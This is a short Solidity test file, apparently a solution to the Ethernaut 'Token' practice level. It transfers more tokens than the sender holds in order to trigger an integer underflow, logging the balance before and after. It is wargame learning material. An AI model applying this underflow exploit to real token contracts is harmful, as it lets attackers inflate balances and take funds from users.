// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/ethernaut/level4/Token.sol";

contract Level4 is Test {
    Token level4;

    function setUp() public {
        level4 = new Token(20);
    }

    function testExploit() public {
        uint256 balanceBefore = level4.balanceOf(address(this));
        console.log(balanceBefore);
        level4.transfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 21);
        uint256 balanceAfter = level4.balanceOf(address(this));
        console.log(balanceAfter);
    }

}
